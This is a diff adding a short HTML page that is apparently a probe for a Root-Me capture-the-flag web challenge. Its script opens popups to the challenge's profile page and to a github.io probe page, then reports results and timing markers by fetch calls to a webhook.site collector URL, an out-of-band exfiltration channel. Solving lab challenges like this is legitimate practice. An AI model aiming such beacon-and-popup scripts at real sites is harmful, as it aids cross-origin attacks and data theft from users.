@@ -1,0 +1,16 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v8</title></head><body>
+<h1>v8</h1>
+<script>
+var CH='http://challenge01.root-me.org:58003';
+var U='https://webhook.site/af9addd2-9c27-4b22-aad4-0001211f0c67';
+function b(k,v){try{fetch(U+'?'+k+'='+encodeURIComponent(String(v==null?'1':v)).slice(0,150));}catch(e){}}
+b('w1');
+var pA=window.open('https://jymbo-9.github.io/probe/pop.html','popA');
+b('popA',pA?'ok':'null');
+var p1=window.open(CH+'/profile','pop1');
+b('pop1',p1?'ok':'null');
+setTimeout(function(){b('t1','1');},1000);
+setTimeout(function(){b('t3','1');},3000);
+setTimeout(function(){b('t5','1');},5000);
+</script>
+</body></html>
